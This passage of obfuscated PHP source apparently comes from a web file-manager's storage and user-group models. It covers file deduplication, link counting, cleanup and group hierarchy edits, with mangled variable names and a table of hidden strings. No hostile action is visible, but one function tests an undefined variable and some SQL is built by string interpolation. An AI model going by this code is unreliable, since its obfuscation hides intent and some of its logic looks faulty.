.= $æñÂˆ¿¢[1221]; } break; case $æñÂˆ¿¢[1922]: $Ê†­î¢ = Model($æñÂˆ¿¢[776])->get($æñÂˆ¿¢[777]); $½ú¿æû = substr(md5($æñÂˆ¿¢[778] . $Ê†­î¢ . date($æñÂˆ¿¢[754])), 0, 8); $êÇ¨İáÒ = KodIO::defaultDriver(); $şâÎ•š‹ = $æñÂˆ¿¢[1252] . $êÇ¨İáÒ[$æñÂˆ¿¢[399]] . $æñÂˆ¿¢[409] . date($æñÂˆ¿¢[1923]) . $½ú¿æû . $æñÂˆ¿¢[8]; if ($÷Í·õèŞ == $æñÂˆ¿¢[1858]) { $ àÑ˜Ç„ .= $æñÂˆ¿¢[1221]; } $ìæËÛôš = $æñÂˆ¿¢[1924] . $şâÎ•š‹ . $ àÑ˜Ç„; CacheLock::lock($ìæËÛôš); $³Üì®ã¸ = $şâÎ•š‹ . $ àÑ˜Ç„; if (IO::exist($şâÎ•š‹ . $ àÑ˜Ç„)) { $çöÍš–· = substr($ àÑ˜Ç„, 0, strlen($ àÑ˜Ç„) - strlen($÷Í·õèŞ)); $’®’ğá§ = $úîƒĞ‚™ ? substr($úîƒĞ‚™, 0, 5) : ($©§”È¥Ë ? substr($©§”È¥Ë, 0, 5) : rand_string(5)); $³Üì®ã¸ = $şâÎ•š‹ . $çöÍš–· . $’®’ğá§ . $æñÂˆ¿¢[10] . $÷Í·õèŞ; } if (IO::isTypeObject($³Üì®ã¸) && !IO::isUploadServer($³Üì®ã¸)) { if (IO::exist($³Üì®ã¸)) { return $³Üì®ã¸; } $ç½öñ¦Ï = IO::setContent($³Üì®ã¸, $æñÂˆ¿¢[12]); if (!$ç½öñ¦Ï) { show_json($æñÂˆ¿¢[1925], !1); } } CacheLock::unlock($ìæËÛôš); break; case $æñÂˆ¿¢[1920]: break; default: break; } return $³Üì®ã¸; } public function addFileByRemote($Ø¤ıëÈ, $£‘ÔØ°Í, $ÄÅŒœÜ = array()) { $Çù»ì¯Â =& $_SERVER[Ã¶¡¶„æ]; if (!IO::exist($Ø¤ıëÈ)) { return !1; } $Í¦Åæ·º = $ÄÅŒœÜ[$Çù»ì¯Â[176]] ? $ÄÅŒœÜ[$Çù»ì¯Â[176]] : $Çù»ì¯Â[12]; $ˆÁ”¿é = IO::hashMd5($Ø¤ıëÈ, $Í¦Åæ·º); $Õşı–Ñê = KodIO::defaultDriver(); $ù¼Ì§”ë = array($Çù»ì¯Â[585] => IO::size($Ø¤ıëÈ), $Çù»ì¯Â[1926] => 1, $Çù»ì¯Â[420] => $£‘ÔØ°Í, $Çù»ì¯Â[814] => $Õşı–Ñê[$Çù»ì¯Â[399]], $Çù»ì¯Â[421] => $Ø¤ıëÈ, $Çù»ì¯Â[1927] => $ÄÅŒœÜ[$Çù»ì¯Â[177]] ? $ÄÅŒœÜ[$Çù»ì¯Â[177]] : IO::hashSimple($Ø¤ıëÈ), $Çù»ì¯Â[1928] => $ˆÁ”¿é ? $ˆÁ”¿é : $Í¦Åæ·º); if ($¦èä‡‚ä = $this->addFileCheckExist($ù¼Ì§”ë[$Çù»ì¯Â[177]], $ù¼Ì§”ë[$Çù»ì¯Â[176]], $ù¼Ì§”ë[$Çù»ì¯Â[76]])) { return $¦èä‡‚ä; } return $this->addFileData($ù¼Ì§”ë); } private function addFileData($£Ìê»•Ò) { $¸‰Ö–„ä =& $_SERVER[Ã¶¡¶„æ]; if (!$£Ìê»•Ò) { return !1; } $£Ìê»•Ò[$¸‰Ö–„ä[76]] = intval($£Ìê»•Ò[$¸‰Ö–„ä[76]]); if (!$£Ìê»•Ò[$¸‰Ö–„ä[76]] && strlen($£Ìê»•Ò[$¸‰Ö–„ä[177]]) > 32) { $£Ìê»•Ò[$¸‰Ö–„ä[76]] = intval(substr($£Ìê»•Ò[$¸‰Ö–„ä[177]], 32)); } $â¬õÜ°« = $this->add($£Ìê»•Ò); return $this->find($â¬õÜ°«); } public function addFile($ë§‰å À, $ÎÙø‰É, $á¾…ÈÑ = false) { $Î Ú‚‰Ô =& $_SERVER[Ã¶¡¶„æ]; $»ó¢µš’ = IO::hashSimple($ë§‰å À); $˜í‡ø˜† = IO::size($ë§‰å À); $£ÌŞü»¡ = $˜í‡ø˜† <= 1024 * 1024 * 10 ? IO::hashMd5($ë§‰å À) : $Î Ú‚‰Ô[12]; $åÒæ¼è = $Î Ú‚‰Ô[1929] . $»ó¢µš’; CacheLock::lock($åÒæ¼è); if ($£ÌŞü»¡ && $»ó¢µš’) { $ú°Á¼•Ï = $this->addFileCheckExist($»ó¢µš’, $£ÌŞü»¡, $˜í‡ø˜†); if ($ú°Á¼•Ï) { CacheLock::unlock($åÒæ¼è); return $ú°Á¼•Ï; } } $­‰Š×É = $this->addFileMake($ë§‰å À, $˜í‡ø˜†, $»ó¢µš’, $£ÌŞü»¡, $ÎÙø‰É, $á¾…ÈÑ); $î´…Ù©° = $this->addFileData($­‰Š×É); CacheLock::unlock($åÒæ¼è); if (!$£ÌŞü»¡ && $î´…Ù©°) { $this->fileMd5Check($î´…Ù©°); } return $î´…Ù©°; } private function fileMd5Check($‘ââ‰¡—) { $‡áõ—€ú =& $_SERVER[Ã¶¡¶„æ]; $å³¬Ş£· = array($‘ââ‰¡—[$‡áõ—€ú[468]], $‘ââ‰¡—[$‡áõ—€ú[84]]); $øêÈÁƒ² = $‡áõ—€ú[1930] . $‘ââ‰¡—[$‡áõ—€ú[84]]; $çáºÏë = $‡áõ—€ú[1931] . $‘ââ‰¡—[$‡áõ—€ú[468]]; $Üáƒó² = TaskQueue::add($‡áõ—€ú[1932], $å³¬Ş£·, $øêÈÁƒ², $çáºÏë); if (!$Üáƒó²) { $this->fileMd5Set($‘ââ‰¡—[$‡áõ—€ú[468]], $‘ââ‰¡—[$‡áõ—€ú[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($¬¿ÍÁ÷‡, $¬ì‘†í) { $¼ïñ¡ë =& $_SERVER[Ã¶¡¶„æ]; $èú«Õì = $this->find($¬¿ÍÁ÷‡); if (!$èú«Õì || $èú«Õì[$¼ïñ¡ë[176]]) { return; } $€ÁƒÕû = IO::hashMd5($¬ì‘†í); if (!$€ÁƒÕû) { return $¼ïñ¡ë[12]; } $this->where(array($¼ïñ¡ë[468] => $¬¿ÍÁ÷‡))->save(array($¼ïñ¡ë[176] => $€ÁƒÕû)); } public function addFileMake($ó¼›Òö«, $¸Ö‹êõ¥, $„ßíá€Ï, $ÍÙ±ÛÏ, $›Úì½ı£, $…ƒËÂ¡) { $‰ÜÜ²Š =& $_SERVER[Ã¶¡¶„æ]; $€²¶îÓö = $this->createFileName($›Úì½ı£, $„ßíá€Ï, $ÍÙ±ÛÏ); $áú“Šğ = get_path_father($€²¶îÓö); $òÙõˆí = get_path_this($€²¶îÓö); if ($…ƒËÂ¡) { $ŸÀ€½“Ò = IO::move($ó¼›Òö«, $áú“Šğ, !1, $òÙõˆí); } else { $ŸÀ€½“Ò = IO::copy($ó¼›Òö«, $áú“Šğ, !1, $òÙõˆí); } if (!$ŸÀ€½“Ò) { return !1; } $ˆ±¢œ× = KodIO::defaultDriver(); $›êª¤øÓ = array($‰ÜÜ²Š[585] => $¸Ö‹êõ¥, $‰ÜÜ²Š[1926] => 1, $‰ÜÜ²Š[420] => $›Úì½ı£, $‰ÜÜ²Š[814] => $ˆ±¢œ×[$‰ÜÜ²Š[399]], $‰ÜÜ²Š[421] => $€²¶îÓö, $‰ÜÜ²Š[1927] => $„ßíá€Ï, $‰ÜÜ²Š[1928] => $ÍÙ±ÛÏ); return $›êª¤øÓ; } public function addFileCheckExist($ùö©…‘Ü, $ñšëÀ£€, $äúßÑà) { $Ä¦ñ‰ˆ¬ =& $_SERVER[Ã¶¡¶„æ]; $€Ù¶–ïü = $this->findByHash($ùö©…‘Ü, $ñšëÀ£€); if (!$€Ù¶–ïü) { return !1; } $ùÅĞŸÄ = array($Ä¦ñ‰ˆ¬[1926] => intval($€Ù¶–ïü[$Ä¦ñ‰ˆ¬[1933]]) + 1, $Ä¦ñ‰ˆ¬[585] => $äúßÑà); $this->where(array($Ä¦ñ‰ˆ¬[469] => $€Ù¶–ïü[$Ä¦ñ‰ˆ¬[468]]))->save($ùÅĞŸÄ); return $€Ù¶–ïü; } public function remove($ŸßøÕ¸¸) { $this->linkCountChange($ŸßøÕ¸¸, !1); $this->clearEmpty(); return !0; } public function linkAdd($íÊ·ğğ) { $this->linkCountChange($íÊ·ğğ, !0); } public function linkCountChange($Òëô¨ü, $ó»Ëœãº) { $õˆ¶ˆãã =& $_SERVER[Ã¶¡¶„æ]; if (!$Òëô¨ü) { return; } if (!is_array($Òëô¨ü)) { $Òëô¨ü = array($Òëô¨ü); } $†ºı·Ê = array(); foreach ($Òëô¨ü as $¡÷‡¤Éå) { $ÚÊŒÉ“¼ = $¡÷‡¤Éå . $õˆ¶ˆãã[12]; if (!$†ºı·Ê[$ÚÊŒÉ“¼]) { $†ºı·Ê[$ÚÊŒÉ“¼] = 0; } $†ºı·Ê[$ÚÊŒÉ“¼]++; } $Ÿø“©Œï = array(); foreach ($†ºı·Ê as $¡÷‡¤Éå => $¤İşšõ) { $ÚÊŒÉ“¼ = $¤İşšõ . $õˆ¶ˆãã[12]; if (!$Ÿø“©Œï[$ÚÊŒÉ“¼]) { $Ÿø“©Œï[$ÚÊŒÉ“¼] = array(); } $Ÿø“©Œï[$ÚÊŒÉ“¼][] = $¡÷‡¤Éå; } foreach ($Ÿø“©Œï as $¤İşšõ => $Áû«´ôŠ) { if (!$Áû«´ôŠ) { continue; } $¤İşšõ = $ó»Ëœãº ? $¤İşšõ : -intval($¤İşšõ); $Õ«…Õ = array($õˆ¶ˆãã[468] => array($õˆ¶ˆãã[7], $Áû«´ôŠ)); if ($¤İşšõ < 0) { $Õ«…Õ[$õˆ¶ˆãã[1933]] = array($õˆ¶ˆãã[1029], abs($¤İşšõ)); } $this->where($Õ«…Õ)->setAdd($õˆ¶ˆãã[1933], $¤İşšõ); } } public function findByHash($‘×™­Ç„, $¹äñÎŠ = false) { $‡ËŒçä¹ =& $_SERVER[Ã¶¡¶„æ]; if (!$‘×™­Ç„ && !$¹äñÎŠ) { return !1; } $Ç¨ò¾ìÁ = array($‡ËŒçä¹[1927] => $‘×™­Ç„); if ($¹äñÎŠ) { $Ç¨ò¾ìÁ = array($‡ËŒçä¹[1928] => $¹äñÎŠ); } return $this->order($‡ËŒçä¹[1934])->where($Ç¨ò¾ìÁ)->find(); } public function clearEmpty($ÜƒôÉ°Ç = 0) { $®‹àšÈê =& $_SERVER[Ã¶¡¶„æ]; $Ê‡²Ìú« = time() - 3600 * 24 * $ÜƒôÉ°Ç; $»·Ş¥« = $®‹àšÈê[1935] . $Ê‡²Ìú«; $Ï…±Í›– = $this->where($»·Ş¥«)->select(); if (!$Ï…±Í›–) { return; } $œ»¾Óç€ = new Task($®‹àšÈê[1936], $®‹àšÈê[12], count($Ï…±Í›–)); foreach ($Ï…±Í›– as $àèœ£ˆ) { $œ»¾Óç€->update(1); $this->resetFile($àèœ£ˆ); } $œ»¾Óç€->end(); } public function resetFile($ÍÁî–Õ) { $»Î«ëö =& $_SERVER[Ã¶¡¶„æ]; $ïåÜÌéø = array($»Î«ëö[469] => $ÍÁî–Õ[$»Î«ëö[468]]); $æ¬¯µ¾í = Model($»Î«ëö[1350])->where($ïåÜÌéø)->count(); $ì†ğß¹Ş = Model($»Î«ëö[1937])->where($ïåÜÌéø)->count(); $Œ§¨ª½‹ = intval($æ¬¯µ¾í) + intval($ì†ğß¹Ş); if ($Œ§¨ª½‹ == 0) { IO::remove($ÍÁî–Õ[$»Î«ëö[84]]); Model($»Î«ëö[1938])->delete($ÍÁî–Õ[$»Î«ëö[468]]); $this->where($ïåÜÌéø)->delete(); $this->metaSet($ÍÁî–Õ[$»Î«ëö[468]], null, null); return; } if ($ÍÁî–Õ[$»Î«ëö[1933]] != $Œ§¨ª½‹) { $this->where($ïåÜÌéø)->save(array($»Î«ëö[1926] => $Œ§¨ª½‹)); } } public function storageInfo($ØßÌÒ¦È = false) { $§ÁÅüşá =& $_SERVER[Ã¶¡¶„æ]; $¢ŒÂÊ¦ä = $this->count() + 0.0; $ÔÙÍÊ = 0; $üëñÌı = 1; $¬¹®™€í = 0; $İ«¾¨İ = 5000; for ($®ıØˆ…³ = 0; $®ıØˆ…³ < $¢ŒÂÊ¦ä; $®ıØˆ…³ = $®ıØˆ…³ + $İ«¾¨İ) { $¨şî†µî = $this->limit($®ıØˆ…³, $®ıØˆ…³ + $İ«¾¨İ)->select(); foreach ($¨şî†µî as $¿Î„¤‹) { $üëñÌı += $¿Î„¤‹[$§ÁÅüşá[76]] * $¿Î„¤‹[$§ÁÅüşá[1933]]; $ÔÙÍÊ += $¿Î„¤‹[$§ÁÅüşá[76]] * ($¿Î„¤‹[$§ÁÅüşá[1933]] - 1); $¬¹®™€í += $¿Î„¤‹[$§ÁÅüşá[1933]]; } } $Ü•Öäƒ¢ = array($§ÁÅüşá[1939] => $üëñÌı, $§ÁÅüşá[1940] => $ÔÙÍÊ, $§ÁÅüşá[1941] => $ÔÙÍÊ / $üëñÌı, $§ÁÅüşá[80] => $¢ŒÂÊ¦ä, $§ÁÅüşá[1942] => $¬¹®™€í); return $Ü•Öäƒ¢; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\160"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\x6d\145" => "\147\162\x6f\165\160\x5f\x6d\x65\x74\x61", "\155\145\164\141\106\151\145\x6c\144" => "\x67\x72\x6f\x75\x70\x49\104"); protected function cacheFunctionAlias($™Ôù¾ş) { $¼îá—¢– =& $_SERVER[Ã¶¡¶„æ]; return array($¼îá—¢–[1943] => array($™Ôù¾ş[0], $¼îá—¢–[1944]), $¼îá—¢–[1945] => array($™Ôù¾ş[0], $¼îá—¢–[1946])); } protected function getInfo($æé—„, $³ë³Éßá = false) { $¸ÅÎØ = $this->getInfoSimple($æé—„); if (!$¸ÅÎØ) { return !1; } if ($³ë³Éßá) { return $this->_listDataApplyItem($¸ÅÎØ); } return $this->cacheFunctionGet($_SERVER[Ã¶¡¶„æ][1947], $æé—„); } protected function getInfoSimple($”Ç‹ĞÒõ, $õ›‰ÂÙÎ = false) { $Çø¾ëÑ =& $_SERVER[Ã¶¡¶„æ]; if ($õ›‰ÂÙÎ) { $Â“®ŞĞŒ = array($Çø¾ëÑ[1865] => intval($”Ç‹ĞÒõ)); $Ş÷ïº® = $this->where($Â“®ŞĞŒ)->find(); return is_array($Ş÷ïº®) ? $Ş÷ïº® : array(); } return $this->cacheFunctionGet($Çø¾ëÑ[1948], $”Ç‹ĞÒõ); } protected function groupAdd($†Ó‹êë) { $â¢ÀÇÉ¢ =& $_SERVER[Ã¶¡¶„æ]; if (!$†Ó‹êë[$â¢ÀÇÉ¢[432]] && isset($†Ó‹êë[$â¢ÀÇÉ¢[1865]]) && $†Ó‹êë[$â¢ÀÇÉ¢[1865]] == 1) { if ($ĞÂóàĞ = $this->getInfoSimple($†Ó‹êë[$â¢ÀÇÉ¢[1865]], !0)) { return $†Ó‹êë[$â¢ÀÇÉ¢[1865]]; } } else { $ĞÂóàĞ = $this->getInfoSimple($†Ó‹êë[$â¢ÀÇÉ¢[432]]); if (!$ĞÂóàĞ) { return !1; } } $³»—ûô© = $â¢ÀÇÉ¢[531]; if ($ĞÂóàĞ[$â¢ÀÇÉ¢[521]]) { $³»—ûô© = $ĞÂóàĞ[$â¢ÀÇÉ¢[521]] . $ĞÂóàĞ[$â¢ÀÇÉ¢[1865]] . $â¢ÀÇÉ¢[50]; } $­°ø¥· = array($â¢ÀÇÉ¢[420] => $this->groupNameAuto($†Ó‹êë[$â¢ÀÇÉ¢[432]], $†Ó‹êë[$â¢ÀÇÉ¢[32]]), $â¢ÀÇÉ¢[401] => $†Ó‹êë[$â¢ÀÇÉ¢[432]], $â¢ÀÇÉ¢[590] => $³»—ûô©, $â¢ÀÇÉ¢[1949] => $†Ó‹êë[$â¢ÀÇÉ¢[1852]], $â¢ÀÇÉ¢[1950] => 0, $â¢ÀÇÉ¢[1869] => 0); if (isset($†Ó‹êë[$â¢ÀÇÉ¢[1889]])) { $­°ø¥·[$â¢ÀÇÉ¢[1889]] = $†Ó‹êë[$â¢ÀÇÉ¢[1889]]; } else { $…Ä¾ƒµâ = $this->max($â¢ÀÇÉ¢[1889]); if (!$…Ä¾ƒµâ) { $…Ä¾ƒµâ = 0; } $­°ø¥·[$â¢ÀÇÉ¢[1889]] = $…Ä¾ƒµâ + 1; } if (!empty($†Ó‹êë[$â¢ÀÇÉ¢[1865]])) { $­°ø¥·[$â¢ÀÇÉ¢[1865]] = $†Ó‹êë[$â¢ÀÇÉ¢[1865]]; } $Ø‡µÂ›æ = $this->add($­°ø¥·); $this->setNamePinyin($Ø‡µÂ›æ, $­°ø¥·[$â¢ÀÇÉ¢[32]]); if (isset($†Ó‹êë[$â¢ÀÇÉ¢[1951]])) { $this->metaSet($Ø‡µÂ›æ, array($â¢ÀÇÉ¢[1951] => $†Ó‹êë[$â¢ÀÇÉ¢[1951]], $â¢ÀÇÉ¢[1952] => $†Ó‹êë[$â¢ÀÇÉ¢[1952]])); unset($†Ó‹êë[$â¢ÀÇÉ¢[1951]]); unset($†Ó‹êë[$â¢ÀÇÉ¢[1952]]); } Model($â¢ÀÇÉ¢[1350])->groupRootAdd($Ø‡µÂ›æ); return $Ø‡µÂ›æ; } protected function groupEdit($µ•¶§µ•, $ö³Í†ß) { $¤à«é¹ø =& $_SERVER[Ã¶¡¶„æ]; $¡¡ÓÜø§ = $this->getInfoSimple($µ•¶§µ•); if (!$¡¡ÓÜø§) { return !1; } if (!empty($ö³Í†ß[$¤à«é¹ø[432]])) { $•ŞÌ½È— = $this->getInfoSimple($ö³Í†ß[$¤à«é¹ø[432]]); if (!$•ŞÌ½È—) { return !1; } if ($¡¡ÓÜø§[$¤à«é¹ø[1865]] == $•ŞÌ½È—[$¤à«é¹ø[1865]]) { return !1; } if ($ö³Í†ß[$¤à«é¹ø[432]] != $¡¡ÓÜø§[$¤à«é¹ø[432]]) { if ($•ŞÌ½È—[$¤à«é¹ø[521]] !== $¡¡ÓÜø§[$¤à«é¹ø[521]] && strpos($•ŞÌ½È—[$¤à«é¹ø[521]], $¡¡ÓÜø§[$¤à«é¹ø[521]] . $¡¡ÓÜø§[$¤à«é¹ø[1865]] . $¤à«é¹ø[50]) === 0) { return !1; } $ö³Í†ß[$¤à«é¹ø[590]] = $•ŞÌ½È—[$¤à«é¹ø[521]] . $ö³Í†ß[$¤à«é¹ø[432]] . $¤à«é¹ø[50]; $this->_changeChildLevel($¡¡ÓÜø§, $•ŞÌ½È—); } } if (isset($ö³Í†ß[$¤à«é¹ø[32]])) { $this->setNamePinyin($µ•¶§µ•, $ö³Í†ß[$¤à«é¹ø[32]]); } if (isset($ö³Í†ß[$¤à«é¹ø[1951]])) { $this->metaSet($µ•¶§µ•, array($¤à«é¹ø[1951] => $ö³Í†ß[$¤à«é¹ø[1951]], $¤à«é¹ø[1952] => $ö³Í†ß[$¤à«é¹ø[1952]])); unset($ö³Í†ß[$¤à«é¹ø[1951]]); unset($ö³Í†ß[$¤à«é¹ø[1952]]); } $this->_clearChildrenCache($¡¡ÓÜø§); return $this->where(array($¤à«é¹ø[1953] => $µ•¶§µ•))->save($ö³Í†ß); } private function _clearChildrenCache($÷¦¯î±ù) { $ÅÓŞŸ×é =& $_SERVER[Ã¶¡¶„æ]; $•êé¢² = array($ÅÓŞŸ×é[590] => array($ÅÓŞŸ×é[550], $÷¦¯î±ù[$ÅÓŞŸ×é[521]] . $÷¦¯î±ù[$ÅÓŞŸ×é[1865]] . $ÅÓŞŸ×é[551])); $­ö†¼µù = $this->field($ÅÓŞŸ×é[1865])->where($•êé¢²)->select(); foreach ($­ö†¼µù as $«é¼”ÕÆ) { $this->_clearCache($«é¼”ÕÆ[$ÅÓŞŸ×é[1865]]); } } private function _clearCache($ÔÇÎ¸Ô) { $æŸÃ®¾ =& $_SERVER[Ã¶¡¶„æ]; $this->cacheFunctionClear($æŸÃ®¾[1947], $ÔÇÎ¸Ô); $this->cacheFunctionClear($æŸÃ®¾[1948], $ÔÇÎ¸Ô); } private function _changeChildLevel($Ï÷Õ×, $àÈëçïù, $âôËà¶ª = false) { $ÂÆ©ñÊĞ =& $_SERVER[Ã¶¡¶„æ]; $ĞƒÚÎÜª = $Ï÷Õ×[$ÂÆ©ñÊĞ[521]] . $Ï÷Õ×[$ÂÆ©ñÊĞ[1865]] . $ÂÆ©ñÊĞ[50]; $¾ºû¬¾” = $àÈëçïù[$ÂÆ©ñÊĞ[521]] . $àÈëçïù[$ÂÆ©ñÊĞ[1865]] . $ÂÆ©ñÊĞ[50] . $Ï÷Õ×[$ÂÆ©ñÊĞ[1865]] . $ÂÆ©ñÊĞ[50]; if ($âôËà¶ª) { $¾ºû¬¾” = $àÈëçïù[$ÂÆ©ñÊĞ[521]] . $àÈëçïù[$ÂÆ©ñÊĞ[1865]] . $ÂÆ©ñÊĞ[50]; } $ÎÊ§Ûë = array($ÂÆ©ñÊĞ[590] => array($ÂÆ©ñÊĞ[550], $Ï÷Õ×[$ÂÆ©ñÊĞ[521]] . $Ï÷Õ×[$ÂÆ©ñÊĞ[1865]] . $ÂÆ©ñÊĞ[551])); $µØ„Ñ® = array($ÂÆ©ñÊĞ[590] => array($ÂÆ©ñÊĞ[599], "\x72\145\160\x6c\x61\x63\145\50\x70\x61\162\x65\156\x74\x4c\x65\166\x65\x6c\x2c\x27{$ĞƒÚÎÜª}\47\54\47{$¾ºû¬¾”}\47\x29")); $this->_clearChildrenCache($Ï÷Õ×); $this->where($ÎÊ§Ûë)->data($µØ„Ñ®)->save(); } public function setNamePinyin($ÒÆæ¨ñ¨, $äõàÀğÏ = false) { $Î™‡¤˜ =& $_SERVER[Ã¶¡¶„æ]; if (!$äõàÀğÏ) { $ûŸÚ¨Óö = $this->getInfoSimple($ÒÆæ¨ñ¨); $äõàÀğÏ = $ûŸÚ¨Óö[$Î™‡¤˜[32]]; } if (!Input::check($äõàÀğÏ, $Î™‡¤˜[593])) { $this->metaSet($ÒÆæ¨ñ¨, $Î™‡¤˜[465], null); $this->metaSet($ÒÆæ¨ñ¨, $Î™‡¤˜[464], null); return; } $ÏÏåšëœ = array($Î™‡¤˜[465] => str_replace($Î™‡¤˜[53], $Î™‡¤˜[12], Pinyin::get($äõàÀğÏ)), $Î™‡¤˜[464] => Pinyin::get($äõàÀğÏ, $Î™‡¤˜[594])); $this->metaSet($ÒÆæ¨ñ¨, $ÏÏåšëœ); } protected function groupStatus($¨ê¤ÃÕ, $ÑÑŸ×Ê) { $“ä™şÓÑ =& $_SERVER[Ã¶¡¶„æ]; $ø¿È·† = $this->getInfoSimple($¨ê¤ÃÕ); if (!$ø¿È·†) { return !1; } if ($ÑÑŸ×Ê == $“ä™şÓÑ[88]) { $úÔÁ¤ÓŸ = $this->parentLevelArray($ø¿È·†[$“ä™şÓÑ[521]]); } else { $Å¼Ğ†Ôğ = array($“ä™şÓÑ[590] => array($“ä™şÓÑ[550], $ø¿È·†[$“ä™şÓÑ[521]] . $ø¿È·†[$“ä™şÓÑ[1865]] . $“ä™şÓÑ[551])); $úÔÁ¤ÓŸ = $this->where($Å¼Ğ†Ôğ)->field($“ä™şÓÑ[1865])->select(); $úÔÁ¤ÓŸ = array_to_keyvalue($úÔÁ¤ÓŸ, $“ä™şÓÑ[12], $“ä™şÓÑ[1865]); } $úÔÁ¤ÓŸ[] = $ø¿È·†[$“ä™şÓÑ[1865]]; $øµ’Å÷± = array(); foreach ($úÔÁ¤ÓŸ as $¨ê¤ÃÕ) { $øµ’Å÷±[] = array($“ä™şÓÑ[1865] => $¨ê¤ÃÕ, $“ä™şÓÑ[94] => $“ä™şÓÑ[756], $“ä™şÓÑ[374] => $ÑÑŸ×Ê); $this->_clearCache($¨ê¤ÃÕ); } return Model($“ä™şÓÑ[1954])->addAll($øµ’Å÷±, array(), !0); } protected function groupRemove($¶Á›öƒ•, $ñ€öúÌà = false) { $ğãœÉşÍ =& $_SERVER[Ã¶¡¶„æ]; $§¶‚º™ = array($ğãœÉşÍ[1865] => $¶Á›öƒ•); $‹ğ¶Ïû = $this->where($§¶‚º™)->find(); if (!$‹ğ¶Ïû || $‹ğ¶Ïû[$ğãœÉşÍ[432]] == 0) { return !1; } if (!$ñ€öúÌà) { $ÈØ²Êü = $this->getInfoSimple($‹ğ¶Ïû[$ğãœÉşÍ[432]]); $this->_changeChildLevel($‹ğ¶Ïû, $ÈØ²Êü, !0); $this->where(array($ğãœÉşÍ[432] => $¶Á›öƒ•))->save(array($ğãœÉşÍ[432] => $‹ğ¶Ïû[$ğãœÉşÍ[432]])); } Model($ğãœÉşÍ[1954])->where($§¶‚º™)->delete(); Model($ğãœÉşÍ[1955])->where($§¶‚º™)->delete(); Model($ğãœÉşÍ[831])->groupRootRemove($¶Á›öƒ•); return $this->where($§¶‚º™)->delete(); } protected function groupSort($±í´œÉÒ) { $‹ÑÌ½Ò =& $_SERVER[Ã¶¡¶„æ]; $Ğç¨¶ô¬ = array(); foreach ($±í´œÉÒ as $¿ñ ¯® => $¶¯­ÑÔ²) { $Ğç¨¶ô¬[] = array($‹ÑÌ½Ò[1865], $¶¯­ÑÔ², $‹ÑÌ½Ò[1889], $¿ñ ¯® + 1); } $this->saveAll($Ğç¨¶ô¬); } public function listData() { $À…õËÖÚ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($À…õËÖÚ[$_SERVER[Ã¶¡¶„æ][369]]); return $À…õËÖÚ; } private function _makeOrder($ÈøËÉûû = '') { $†„ûÉòö =& $_SERVER[Ã¶¡¶„æ]; $Ã—ïÏ×¶ = array($†„ûÉòö[1865], $†„ûÉòö[32], $†„ûÉòö[1854], $†„ûÉòö[200]); $¡‡“òÉ” = array($†„ûÉòö[450] => $†„ûÉòö[451], $†„ûÉòö[452] => $†„ûÉòö[453]); $Ò“‡”¸ = Input::get($†„ûÉòö[457], $†„ûÉòö[7], $†„ûÉòö[1869], $Ã—ïÏ×¶); $»ïÆˆ¤ñ = Input::get($†„ûÉòö[458], $†„ûÉòö[7], $†„ûÉòö[1956], array($†„ûÉòö[1956], $†„ûÉòö[452])); $»ïÆˆ¤ñ = $¡‡“òÉ”[$»ïÆˆ¤ñ]; $ÈøËÉûû = $ÈøËÉûû . "{$Ò“‡”¸}\x20{$»ïÆˆ¤ñ}\x2c\x20\x67\x72\157\x75\x70\111\104\40\x61\163\x63"; return $this->order($ÈøËÉûû); } public function listChild($†––¼Œë) { $ê‰È­Åı =& $_SERVER[Ã¶¡¶„æ]; $¨êù€ÏÂ = $this->where(array($ê‰È­Åı[432] => $†––¼Œë))->_makeOrder()->selectPage(200); $this->_listDataApply($¨êù€ÏÂ[$ê‰È­Åı[369]]); return $¨êù€ÏÂ; } public function listChildIds($ÀÔƒõÜË) { $·¬Šêƒ =& $_SERVER[Ã¶¡¶„æ]; if (is_string($€Øùïªá)) { $ÀÔƒõÜË = explode($·¬Šêƒ[50], $ÀÔƒõÜË); } $Û¡³ü = $this->where(array($·¬Šêƒ[1865] => array($·¬Šêƒ[7], $ÀÔƒõÜË)))->field($·¬Šêƒ[1957])->select(); if (!$Û¡³ü) { return !1; } $´À„…ÔŠ = array(); foreach ($Û¡³ü as $Œ‹Ã×Ä¿) { $´À„…ÔŠ[] = "\x73\x65\x6c\x65\x63\x74\40\147\x72\x6f\x75\x70\111\x44\x20\x66\x72\x6f\x6d\x20\140\x67\162\157\x75\160\140\40\167\x68\145\x72\x65\40\160\x61\162\x65\156\x74\114\x65\166\x65\x6c\40\x6c\x69\153\x65\x20\x27{$Œ‹Ã×Ä¿[$·¬Šêƒ[521]]}{$Œ‹Ã×Ä¿[$·¬Šêƒ[1865]]}\54\45\47"; } $´À„…ÔŠ = implode($·¬Šêƒ[1958], $´À„…ÔŠ); $Û¡³ü = $this->query($´À„…ÔŠ); if (!$Û¡³ü) { return array(); } $ÀÔƒõÜË = array_to_keyvalue($Û¡³ü, $·¬Šêƒ[12], $·¬Šêƒ[1865]); return array_unique($ÀÔƒõÜË); } public function listByID($¯™ç£ºó) { $”Š÷ÄŸê =& $_SERVER[Ã¶¡¶„æ]; if (!$¯™ç£ºó) { return array(); } $ŞêŞø‹â = array($”Š÷ÄŸê[1865] => array($”Š÷ÄŸê[7], $¯™ç£ºó)); $£§–¿›Ä = $this->where($ŞêŞø‹â)->select(); $£§–¿›Ä = array_sort_keep($£§–¿›Ä, $”Š÷ÄŸê[1865], $¯™ç£ºó); $this->_listDataApply($£§–¿›Ä); return $£§–¿›Ä; } public function listSearch($û‹¼•ñ) { $·Ôêó¼  =& $_SERVER[Ã¶¡¶„æ]; $¦€¤‘ÕŸ = $û‹¼•ñ[$·Ôêó¼ [1959]]; $ƒáÂ¾©¦ = isset($û‹¼•ñ[$·Ôêó¼ [1960]]) ? $û‹¼•ñ[$·Ôêó¼ [1960]] : !1; if (!trim($¦€¤‘ÕŸ)) { return !1; } $¦€¤‘ÕŸ = str_replace($·Ôêó¼ [1961], $·Ôêó¼ [1962], $¦€¤‘ÕŸ); $Ø»¤©Ÿâ = array($·Ôêó¼ [1865] => array($·Ôêó¼ [383], "{$¦€¤‘ÕŸ}\45"), $·Ôêó¼ [32] => array($·Ôêó¼ [383], "\x25{$¦€¤‘ÕŸ}\45"), $·Ôêó¼ [1014] => $·Ôêó¼ [1963]); if ($ƒáÂ¾©¦) { $µ“ßÔ¤Í = $this->getInfoSimple($ƒáÂ¾©¦); $†ûú™²³ = $µ“ßÔ¤Í[$·Ôêó¼ [521]] . 